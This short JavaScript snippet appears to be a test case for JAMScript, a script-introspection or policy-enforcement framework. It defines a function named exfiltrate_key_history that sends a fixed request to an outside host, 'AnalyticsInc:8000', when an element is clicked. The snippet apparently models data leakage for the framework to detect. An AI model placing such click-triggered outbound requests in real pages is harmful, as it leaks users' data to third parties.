
JAM.startProfile('load');
introspect(JAMScript.introspectors.processAll) {
function exfiltrate_key_history() {
  xmlhttp = new XMLHttpRequest;
  xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=baseline", true);
  xmlhttp.send(null);
  return
}
var v0 = document.getElementById("test");
v0.onclick = exfiltrate_key_history;

}

JAM.stopProfile('load');
